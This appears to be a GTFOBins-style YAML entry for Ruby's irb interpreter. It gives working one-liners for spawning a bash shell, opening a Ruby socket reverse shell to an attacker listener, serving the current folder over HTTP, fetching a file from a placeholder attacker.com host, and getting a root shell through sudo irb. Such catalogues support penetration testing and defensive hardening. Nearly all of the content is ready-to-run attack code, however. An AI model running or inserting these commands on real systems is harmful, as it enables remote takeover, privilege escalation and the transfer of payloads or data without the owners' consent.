---
functions:
  shell:
    - description: |
        `irb` lets you execute ruby commands as well as shell commands with `exec`.
      code: |
        irb 
        exec '/bin/bash'
  reverse-shell:
    - description: Run `nc -lvp RPORT` on the attacker box to receive the shell.
      code: |
        export RHOST='127.0.0.1'
        export RPORT=9000
        irb
        require 'socket'; s= Socket.new 2,1; s.connect Socket.sockaddr_in ENV['RPORT'], ENV['RHOST']; [0,1,2].each { |fd| syscall 33, s.fileno, fd }; exec '/bin/sh -i'
  file-upload:
    - description: Serve files in the local folder running an HTTP server on port 8080.
      code: |
        irb
        require 'webrick'; WEBrick::HTTPServer.new(:Port => 8000, :DocumentRoot => Dir.pwd).start;
  file-download:
    - description: Fetch a remote file via an HTTP GET request and store it in `PWD`.
      code: |
        export URL=http://attacker.com/file_to_get
        export FILE=file_name
        irb
        require 'open-uri'; download = open(ENV['URL']); IO.copy_stream(download, ENV['FILE'])
  sudo:
    - code: |
        sudo irb
        exec '/bin/bash'
---
